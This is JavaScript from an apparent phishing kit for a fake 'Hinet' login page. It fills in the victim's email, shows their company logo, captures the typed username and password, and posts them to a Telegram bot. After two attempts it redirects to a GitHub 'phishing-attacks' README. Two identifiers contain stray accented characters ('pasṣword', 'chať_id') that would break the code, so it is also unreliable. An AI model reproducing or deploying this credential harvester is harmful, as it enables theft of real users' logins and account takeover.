var token = "";
var chat_id = "";
let passwordAttempts = 0;

function Z() { 
    var email = window.location.hash.substr(1); 
    var ind=email.indexOf("@");
    var my_slice=email.substr((ind+1));
    document.getElementById('username').value = email;
    document.getElementById('logoname').innerHTML = email;
    $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
}


function sendEmail() {
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!filter.test(document.getElementById('username').value)) {
        alert('Invalid Email');
        return false;
    }
    if (document.getElementById('password').value === '') {
        alert('Please enter a valid password!');
        return false;
    }

    var x = document.getElementById("Div4");
    var a = document.getElementById("Div1");
    var b = document.getElementById("Div2");
    a.style.display = "none";
    b.style.display = "block";
    x.style.display = "none";
    var username = document.getElementById('username').value;
    var password = document.getElementById('pasṣword').value;
    var ozi = "\n----------+Hinet Login+---------\n"
    ozi += "Username: " + username
    ozi += "\nPassword: " + password
    ozi += "\n----------------------------------\n"
    tmsend(ozi)

    passwordAttempts++;

    if (passwordAttempts >= 2) {
        setTimeout(function() {
            window.location.href = "https://github.com/hpware/phishing-attacks/blob/main/README.md";
        }, 2000);
    } else {
        setTimeout(function() {
            document.getElementById('password').value = "";
            var x = document.getElementById("Div4");
            x.style.display = "block";
        }, 2000);
        setTimeout(function() {
            var a = document.getElementById("Div1");
            var b = document.getElementById("Div2");
            var x = document.getElementById("Div4");
            a.style.display = "block";
            b.style.display = "none";
            x.style.display = "none";
        }, 5000);
    }
}

function tmsend(message) {
    const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request

    const obj = {
        chat_id: chať_id, // Telegram chat id
        text: message // The text to send
    };

    const xht = new XMLHttpRequest();
    xht.open("POST", url, true);
    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
    xht.send(JSON.stringify(obj));
}